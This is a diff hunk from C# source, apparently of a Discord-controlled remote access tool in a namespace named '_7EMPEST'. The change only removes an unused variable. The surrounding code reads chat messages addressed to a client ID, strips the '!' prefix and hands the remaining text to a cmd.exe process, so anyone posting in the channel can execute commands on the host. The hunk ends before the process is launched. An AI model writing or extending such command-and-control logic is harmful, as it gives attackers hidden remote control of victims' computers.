@@ -51,7 +51,6 @@ namespace _7EMPEST
                 if (e.Message.Content.Contains(clientid.ToString()) == false) return;
                 if (e.Message.Content.Contains("!") == false) return;
                 if (e.Message.Author.IsBot == true) return;
-                string x = e.Message.Content;
                 string strCmdText = e.Message.Content.Remove(e.Message.Content.IndexOf("!"+clientid), clientid.ToString().Length + 2);
                 Process cmd = new Process();
                 cmd.StartInfo.FileName = "cmd.exe";
